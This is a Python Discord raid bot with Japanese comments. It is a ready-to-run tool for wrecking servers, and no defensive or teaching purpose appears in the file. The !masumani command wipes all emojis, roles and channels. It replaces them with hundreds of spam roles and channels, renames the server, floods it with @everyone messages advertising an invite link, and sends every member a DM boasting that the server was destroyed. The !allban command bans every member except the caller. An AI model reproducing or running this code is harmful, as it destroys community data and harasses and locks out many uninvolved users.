import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import os
from datetime import datetime, timedelta
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} logged in')
    print(f'Bot ID: {bot.user.id}')

@bot.command()
async def masumani(ctx):
    new_server_name = 'ますまに共栄圏植民地｜MSMN'
    icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
    channel_name = 'ますまに共栄圏最強'
    channel_count = 200
    spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
    spam_count = 10  # 500から10に変更（現実的な数）
    role_name = 'ますまに共栄圏に荒らされましたww'
    role_count = 100

    await ctx.message.delete()
    guild = ctx.guild
    old_server_name = guild.name
    user = ctx.author

    await user.send('処理を開始します')

    # 1. 絵文字削除（並列）
    emoji_delete_tasks = [emoji.delete() for emoji in guild.emojis]
    emoji_delete_results = await asyncio.gather(*emoji_delete_tasks, return_exceptions=True)
    emoji_deleted = sum(1 for r in emoji_delete_results if not isinstance(r, Exception))
    await user.send(f'絵文字削除: {emoji_deleted}個')

    # 待機
    await asyncio.sleep(1)

    # アイコンダウンロード
    icon_bytes = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
    except:
        pass

    # 2. 絵文字作成（バッチ処理）
    emoji_created = 0
    if icon_bytes:
        try:
            max_emojis = guild.emoji_limit
            for i in range(0, max_emojis, 5):
                batch = min(5, max_emojis - i)
                emoji_tasks = [guild.create_custom_emoji(name=f'emoji{i+j}', image=icon_bytes) for j in range(batch)]
                emoji_results = await asyncio.gather(*emoji_tasks, return_exceptions=True)
                emoji_created += sum(1 for r in emoji_results if not isinstance(r, Exception))
                await asyncio.sleep(0.5)
        except:
            pass
    await user.send(f'絵文字作成: {emoji_created}個')

    # 待機
    await asyncio.sleep(1)

    # 3. ロール削除（バッチ処理）
    roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed]
    role_deleted = 0
    for i in range(0, len(roles_to_delete), 10):
        batch = roles_to_delete[i:i+10]
        role_delete_tasks = [role.delete() for role in batch]
        role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
        role_deleted += sum(1 for r in role_delete_results if not isinstance(r, Exception))
        await asyncio.sleep(0.5)
    await user.send(f'ロール削除: {role_deleted}個')

    # 待機
    await asyncio.sleep(1)

    # 4. ロール作成（バッチ処理）
    role_created = 0
    for i in range(0, role_count, 10):
        batch = min(10, role_count - i)
        role_tasks = []
        for j in range(batch):
            color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
            role_tasks.append(guild.create_role(name=role_name, color=color))
        role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
        role_created += sum(1 for r in role_results if not isinstance(r, Exception))
        await asyncio.sleep(0.5)
    await user.send(f'ロール作成: {role_created}個')

    # 5. DM送信（並列）
    async def send_dm(member):
        try:
            await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
            return 1
        except:
            return 0

    dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
    dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
    dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
    await user.send(f'DM送信完了: {dm_count}人')

    # 6. アイコン・サーバー名変更
    try:
        if icon_bytes:
            await guild.edit(name=new_server_name, icon=icon_bytes)
        else:
            await guild.edit(name=new_server_name)
        await user.send('サーバー設定変更完了')
    except:
        pass

    # 7. イベント作成（30個並列）
    event_tasks = []
    start_time = datetime.now()
    end_time = start_time + timedelta(days=365)

    for i in range(30):
        try:
            event_tasks.append(guild.create_scheduled_event(
                name='ますまに共栄圏最強！',
                description='場所はhttps://discord.gg/DCKWUNfEA5',
                start_time=start_time,
                end_time=end_time,
                location='https://discord.gg/DCKWUNfEA5',
                entity_type=discord.EntityType.external,
                privacy_level=discord.PrivacyLevel.guild_only,
                image=icon_bytes if icon_bytes else None
            ))
        except:
            pass

    event_results = await asyncio.gather(*event_tasks, return_exceptions=True)
    event_created = sum(1 for r in event_results if not isinstance(r, Exception))
    await user.send(f'イベント作成: {event_created}個')

    # 8. チャンネル削除（バッチ処理）
    channels_to_delete = list(guild.channels)
    deleted_count = 0
    for i in range(0, len(channels_to_delete), 10):
        batch = channels_to_delete[i:i+10]
        channel_delete_tasks = [channel.delete() for channel in batch]
        channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
        deleted_count += sum(1 for r in channel_delete_results if not isinstance(r, Exception))
        await asyncio.sleep(0.5)
    await user.send(f'チャンネル削除: {deleted_count}個')

    # 待機
    await asyncio.sleep(2)

    # 9. チャンネル作成（バッチ処理）
    created_channels = []
    created_count = 0
    for i in range(0, channel_count, 5):
        batch = min(5, channel_count - i)
        channel_tasks = [guild.create_text_channel(name=channel_name) for j in range(batch)]
        channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
        for r in channel_results:
            if not isinstance(r, Exception):
                created_channels.append(r)
                created_count += 1
        await asyncio.sleep(1)
    await user.send(f'チャンネル作成: {created_count}個')

    await asyncio.sleep(2)

    # 10. メッセージ送信（大幅に制限）
    await user.send('メッセージ送信中...')

    # spam_countを10に減らす（500は多すぎる）
    limited_spam_count = 10

    async def spam_channel_limited(channel):
        count = 0
        for i in range(limited_spam_count):
            try:
                await channel.send(spam_message)
                count += 1
                await asyncio.sleep(1)  # 1秒待機
            except:
                pass
        return count

    # 5チャンネルずつ処理
    total_messages = 0
    for i in range(0, len(created_channels), 5):
        batch = created_channels[i:i+5]
        spam_tasks = [spam_channel_limited(ch) for ch in batch]
        spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
        total_messages += sum(r for r in spam_results if not isinstance(r, Exception))
        await asyncio.sleep(2)

    await user.send(f'完了 メッセージ送信: {total_messages}件')

@bot.command()
async def allban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    user = ctx.author

    await user.send('BAN処理開始')

    members = [m for m in guild.members if not m.bot and m != user]
    total = len(members)

    await user.send(f'対象: {total}人')

    banned = 0
    failed = 0

    for member in members:
        try:
            await guild.ban(member, reason='ますまに共栄圏BAN')
            banned += 1
            if banned % 10 == 0:
                await user.send(f'進捗: {banned}/{total}')
        except:
            failed += 1

    await user.send(f'完了 成功:{banned} 失敗:{failed}')

if __name__ == '__main__':
    TOKEN = os.getenv('TOKEN')
    if not TOKEN:
        print('TOKEN not found')
        exit(1)
    bot.run(TOKEN)